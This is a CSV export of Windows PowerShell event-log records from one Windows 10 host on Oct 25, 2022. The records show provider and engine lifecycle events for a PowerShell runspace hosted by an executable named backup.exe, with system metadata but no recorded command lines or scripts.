+39,"Oct 25, 2022 @ 04:25:34.442",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,15,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""WSMan"" is Started. 
+
+Details: 
+	ProviderName=WSMan
+	NewProviderState=Started
+
+	SequenceNumber=15
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=107c800a-c837-4c4b-bddc-d928fd0a69b0
+	HostApplication=C:\Users\zhongli\Downloads\backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,WSMan,Started,-,C:\Users\zhongli\Downloads\backup.exe,1,C:\Users\zhongli\Downloads\backup.exe,C:\Users\zhongli\Downloads\backup.exe,107c800a-c837-4c4b-bddc-d928fd0a69b0,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,323,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+40,"Oct 25, 2022 @ 04:25:34.442",DESKTOP-32EH6N8,Engine Lifecycle,400,powershell,-,PowerShell,17,start,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=17
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=107c800a-c837-4c4b-bddc-d928fd0a69b0
+	HostApplication=C:\Users\zhongli\Downloads\backup.exe
+	EngineVersion=5.1.19041.1237
+	RunspaceId=53d1e0af-cbbb-4fa3-9f4a-381685e44bc5
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",Available,None,5.1.19041.1237,0.5.0.27,-,-,53d1e0af-cbbb-4fa3-9f4a-381685e44bc5,C:\Users\zhongli\Downloads\backup.exe,1,C:\Users\zhongli\Downloads\backup.exe,C:\Users\zhongli\Downloads\backup.exe,107c800a-c837-4c4b-bddc-d928fd0a69b0,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,400,Classic,-,-,Info,-,-,-,PowerShell,324,Engine Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+41,"Oct 25, 2022 @ 04:24:53.912",DESKTOP-32EH6N8,Engine Lifecycle,403,powershell,-,PowerShell,21,end,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=21
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=e7dc170e-d894-4843-b464-9e31f4ced341
+	HostApplication=backup.exe
+	EngineVersion=5.1.19041.1237
+	RunspaceId=71c1f809-fadb-44d7-b037-eb4da9fca8a5
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",Stopped,Available,5.1.19041.1237,0.5.0.27,-,-,71c1f809-fadb-44d7-b037-eb4da9fca8a5,backup.exe,1,backup.exe,backup.exe,e7dc170e-d894-4843-b464-9e31f4ced341,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,403,Classic,-,-,Info,-,-,-,PowerShell,315,Engine Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+42,"Oct 25, 2022 @ 04:24:53.584",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,1,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Registry"" is Started. 
+
+Details: 
+	ProviderName=Registry
+	NewProviderState=Started
+
+	SequenceNumber=1
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=e7dc170e-d894-4843-b464-9e31f4ced341
+	HostApplication=backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,Registry,Started,-,backup.exe,1,backup.exe,backup.exe,e7dc170e-d894-4843-b464-9e31f4ced341,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,306,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+43,"Oct 25, 2022 @ 04:24:53.584",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,3,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Alias"" is Started. 
+
+Details: 
+	ProviderName=Alias
+	NewProviderState=Started
+
+	SequenceNumber=3
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=e7dc170e-d894-4843-b464-9e31f4ced341
+	HostApplication=backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,Alias,Started,-,backup.exe,1,backup.exe,backup.exe,e7dc170e-d894-4843-b464-9e31f4ced341,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,307,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+44,"Oct 25, 2022 @ 04:24:53.584",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,5,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Environment"" is Started. 
+
+Details: 
+	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=e7dc170e-d894-4843-b464-9e31f4ced341
+	HostApplication=backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,Environment,Started,-,backup.exe,1,backup.exe,backup.exe,e7dc170e-d894-4843-b464-9e31f4ced341,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,308,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+45,"Oct 25, 2022 @ 04:24:53.584",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,7,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""FileSystem"" is Started. 
+
+Details: 
+	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=e7dc170e-d894-4843-b464-9e31f4ced341
+	HostApplication=backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,FileSystem,Started,-,backup.exe,1,backup.exe,backup.exe,e7dc170e-d894-4843-b464-9e31f4ced341,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,309,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+46,"Oct 25, 2022 @ 04:24:53.584",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,9,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Function"" is Started. 
+
+Details: 
+	ProviderName=Function
+	NewProviderState=Started
+
+	SequenceNumber=9
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=e7dc170e-d894-4843-b464-9e31f4ced341
+	HostApplication=backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,Function,Started,-,backup.exe,1,backup.exe,backup.exe,e7dc170e-d894-4843-b464-9e31f4ced341,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,310,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+47,"Oct 25, 2022 @ 04:24:53.584",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,11,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Variable"" is Started. 
+
+Details: 
+	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=e7dc170e-d894-4843-b464-9e31f4ced341
+	HostApplication=backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,Variable,Started,-,backup.exe,1,backup.exe,backup.exe,e7dc170e-d894-4843-b464-9e31f4ced341,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,311,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+48,"Oct 25, 2022 @ 04:24:53.584",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,13,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Certificate"" is Started. 
+
+Details: 
+	ProviderName=Certificate
+	NewProviderState=Started
+
+	SequenceNumber=13
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=e7dc170e-d894-4843-b464-9e31f4ced341
+	HostApplication=backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,Certificate,Started,-,backup.exe,1,backup.exe,backup.exe,e7dc170e-d894-4843-b464-9e31f4ced341,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,312,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+49,"Oct 25, 2022 @ 04:24:53.584",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,15,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""WSMan"" is Started. 
+
+Details: 
+	ProviderName=WSMan
+	NewProviderState=Started
+
+	SequenceNumber=15
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=e7dc170e-d894-4843-b464-9e31f4ced341
+	HostApplication=backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,WSMan,Started,-,backup.exe,1,backup.exe,backup.exe,e7dc170e-d894-4843-b464-9e31f4ced341,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,313,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+50,"Oct 25, 2022 @ 04:24:53.584",DESKTOP-32EH6N8,Engine Lifecycle,400,powershell,-,PowerShell,17,start,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=17
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=e7dc170e-d894-4843-b464-9e31f4ced341
+	HostApplication=backup.exe
+	EngineVersion=5.1.19041.1237
+	RunspaceId=71c1f809-fadb-44d7-b037-eb4da9fca8a5
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",Available,None,5.1.19041.1237,0.5.0.27,-,-,71c1f809-fadb-44d7-b037-eb4da9fca8a5,backup.exe,1,backup.exe,backup.exe,e7dc170e-d894-4843-b464-9e31f4ced341,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,400,Classic,-,-,Info,-,-,-,PowerShell,314,Engine Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+51,"Oct 25, 2022 @ 04:24:01.048",DESKTOP-32EH6N8,Engine Lifecycle,403,powershell,-,PowerShell,21,end,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=21
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=6d7abb1e-99a0-44d7-abe1-c383454e609c
+	HostApplication=c:\backup\backup.exe
+	EngineVersion=5.1.19041.1237
+	RunspaceId=f4b745f4-217a-409d-acec-19d1db41bbd8
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",Stopped,Available,5.1.19041.1237,0.5.0.27,-,-,f4b745f4-217a-409d-acec-19d1db41bbd8,c:\backup\backup.exe,1,c:\backup\backup.exe,c:\backup\backup.exe,6d7abb1e-99a0-44d7-abe1-c383454e609c,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,403,Classic,-,-,Info,-,-,-,PowerShell,305,Engine Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+52,"Oct 25, 2022 @ 04:24:00.402",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,13,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""Certificate"" is Started. 
+
+Details: 
+	ProviderName=Certificate
+	NewProviderState=Started
+
+	SequenceNumber=13
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=6d7abb1e-99a0-44d7-abe1-c383454e609c
+	HostApplication=c:\backup\backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,Certificate,Started,-,c:\backup\backup.exe,1,c:\backup\backup.exe,c:\backup\backup.exe,6d7abb1e-99a0-44d7-abe1-c383454e609c,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,302,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+53,"Oct 25, 2022 @ 04:24:00.402",DESKTOP-32EH6N8,Provider Lifecycle,600,powershell,-,PowerShell,15,info,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Provider ""WSMan"" is Started. 
+
+Details: 
+	ProviderName=WSMan
+	NewProviderState=Started
+
+	SequenceNumber=15
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=6d7abb1e-99a0-44d7-abe1-c383454e609c
+	HostApplication=c:\backup\backup.exe
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",-,-,-,0.5.0.27,WSMan,Started,-,c:\backup\backup.exe,1,c:\backup\backup.exe,c:\backup\backup.exe,6d7abb1e-99a0-44d7-abe1-c383454e609c,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,-,-,Info,-,-,-,PowerShell,303,Provider Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+54,"Oct 25, 2022 @ 04:24:00.402",DESKTOP-32EH6N8,Engine Lifecycle,400,powershell,-,PowerShell,17,start,-,-,-,x86_64,DESKTOP-32EH6N8,45429efd-c10a-4299-8a01-8a10b0cbf1b8,"fe80::7959:555c:b4f7:82d3, 192.168.170.20, fe80::f415:e770:257d:42d7, 169.254.66.215","00:0c:29:6e:f6:d9, f8:89:d2:da:70:74",DESKTOP-32EH6N8,19044.1288,windows,10.0.19041.1288 (WinBuild.160101.0800),Windows 10 Pro,Windows 10 Pro,windows,windows,10.0,information,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=17
+
+	HostName=PSRunspace-Host
+	HostVersion=0.5.0.27
+	HostId=6d7abb1e-99a0-44d7-abe1-c383454e609c
+	HostApplication=c:\backup\backup.exe
+	EngineVersion=5.1.19041.1237
+	RunspaceId=f4b745f4-217a-409d-acec-19d1db41bbd8
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",Available,None,5.1.19041.1237,0.5.0.27,-,-,f4b745f4-217a-409d-acec-19d1db41bbd8,c:\backup\backup.exe,1,c:\backup\backup.exe,c:\backup\backup.exe,6d7abb1e-99a0-44d7-abe1-c383454e609c,-,-,-,-,-,PSRunspace-Host,PSRunspace-Host,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,DESKTOP-32EH6N8,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,400,Classic,-,-,Info,-,-,-,PowerShell,304,Engine Lifecycle,-,-,-,-,-,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
